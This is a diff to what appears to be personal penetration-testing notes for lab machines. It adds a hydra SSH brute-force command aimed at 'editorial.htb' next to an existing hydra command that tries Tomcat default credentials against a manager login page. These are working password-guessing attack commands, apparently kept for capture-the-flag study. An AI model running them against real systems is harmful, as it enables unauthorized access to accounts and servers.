@@ -33,3 +33,7 @@ Using different wordlists
 Default Login popup on a webserver
 
 	hydra -C /usr/share/wordlists/SecLists/Passwords/Default-Credentials/tomcat-betterdefaultpasslist.txt <ip_target> -s 8080 http-get /manager/
+
+Bruteforce ssh
+
+	└─$ hydra -L users.txt -P passwords.txt ssh://editorial.htb
